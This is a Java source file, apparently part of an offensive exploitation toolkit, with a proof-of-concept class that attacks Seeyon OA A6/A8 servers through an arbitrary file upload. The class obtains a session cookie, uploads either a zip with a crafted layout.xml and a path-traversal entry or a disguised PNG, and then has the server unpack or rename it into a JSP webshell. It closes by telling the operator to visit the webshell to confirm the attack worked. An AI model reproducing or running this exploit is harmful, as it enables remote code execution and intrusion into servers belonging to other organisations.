package com.droplab.Controller.Seeyon.Service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.droplab.Controller.Seeyon.Common.A6V5V6SessionGet;
import com.droplab.Controller.Seeyon.Common.PortalDesignerManager;
import com.droplab.Controller.Seeyon.Common.UploadMenuIconFile;
import com.droplab.Utils.*;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.io.File;
import java.nio.file.Files;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class A6FileUploadPoc extends BugService {
    private final String contentPath = "/fileUpload.do?method=processUpload&maxSize=&from=a8genius";
    private final String layoutXML = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iZ2IyMzEyIiA/Pg0KPG5hbWU+PC9uYW1lPg0KPHByZUltYWdlPjwvcHJlSW1hZ2U+DQo8ZGVzaWduZXJIdG1sUGF0aD48L2Rlc2lnbmVySHRtbFBhdGg+DQo8ZGVzaWduZXJDc3NQYXRoPjwvZGVzaWduZXJDc3NQYXRoPg0KPGRlc2lnbmVySnNQYXRoPjwvZGVzaWduZXJKc1BhdGg+DQo8aHRtbFBhdGg+PC9odG1sUGF0aD4NCjxjc3NQYXRoPjwvY3NzUGF0aD4NCjxqc1BhdGg+PC9qc1BhdGg+DQo8ZGVmYXVsdFNraW4+PC9kZWZhdWx0U2tpbj4NCjxza2lucz48c2tpbj48L3NraW4+PC9za2lucz4="; //压缩包中layout.xml的内容

    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String pType = null;  //不同的利用链
                String url = null;
                String filepath = null;
                String version = null;
                String filename = null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("pType")) {
                        pType = params.get(key);
                    } else if (key.equals("url")) {
                        url = params.get(key);
                    } else if (key.equals("version")) {
                        version = params.get(key);
                    } else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    }else if (key.equals("filename")) {
                        filename = params.get(key);
                    }
                }
                if (url != null && !url.equals("")) {
                    HashMap headers = new HashMap();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url);

                    if (version.equals("A6")) {
                        String cookie = A6V5V6SessionGet.instance().getCookie("", url);
                        headers.put("Cookie", cookie);
                    } else if (version.equals("A8")) {

                    }
                    /**
                     * 文件上传
                     */
                    HashMap uFileMap = new HashMap();
                    if (pType.equals("PortalDesignerManager")) {
                        String fileLayout = System.getProperty("java.io.tmpdir") + "//layout.xml";
                        Files.write(new File(fileLayout).toPath(), Base64.getDecoder().decode(layoutXML));
                        HashMap fileMap = new HashMap();
                        fileMap.put(fileLayout, "|false"); //这个不需要目录穿越
                        fileMap.put(filepath, "");
                        FileZipUtils fileZipUtils = new FileZipUtils(1, "windows");
                        File zip = fileZipUtils.createZip(fileMap, System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".zip");
                        uFileMap.put("file1", new File(zip.getAbsolutePath()));
                    } else if (pType.equals("UploadMenuIcon")) {
                        String fileShell = System.getProperty("java.io.tmpdir") + "//logon.png";
                        if(new File(fileShell).exists()){
                            new File(fileShell).delete();
                        }
                        boolean b = new File(filepath).renameTo(new File(fileShell));
                        uFileMap.put("file1", new File(fileShell));
                    }
                    HashMap paramMap = new HashMap();
                    paramMap.put("isEncrypt", "");
                    paramMap.put("maxSize", "");
                    paramMap.put("destFilename", "");
                    paramMap.put("destDirectory", "");
                    paramMap.put("applicationCategory", "");
                    paramMap.put("extensions", "");
                    paramMap.put("type", "");

                    Connection.Response response = HttpUtils.post(url + contentPath, headers, paramMap, uFileMap);
                    String content = new String(response.bodyAsBytes());
                    String fileId = "";
                    if (content.contains("fileUrl")) {
                        try {
                            ArrayList arrays = JSON.parseObject(content, ArrayList.class);
                            JSONObject jsonObject = (JSONObject) arrays.get(0);
                            fileId = (String) jsonObject.get("fileUrl");
                        } catch (Exception e) {
                            String namePattern = "fileurls\\s*=\\s*fileurls\\+\",\"\\+'([\\-\\d]+)';";
                            Pattern r = Pattern.compile(namePattern);
                            Matcher m = r.matcher(content);
                            fileId = m.group(1);
                        }
                    }

                    /**
                     * 进行文件移动，或者解压
                     */
                    if(fileId != null && !fileId.equals("")){
                        switch (Objects.requireNonNull(pType)) {
                            case "PortalDesignerManager":
                                boolean b = PortalDesignerManager.instance().portalDesignerManager(url, fileId, headers);
                                break;
                            case "UploadMenuIcon":
                            default:
                                boolean b1 = UploadMenuIconFile.instance().UploadMenuIcon(url, fileId, filename+".jsp", headers);
                                break;
                        }
                    }
                    ResponseUtils responseUtils = new ResponseUtils();
                    responseUtils.setMessage("攻击结束，请尝试访问webshell检测是否攻击成功。");
                    return responseUtils;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
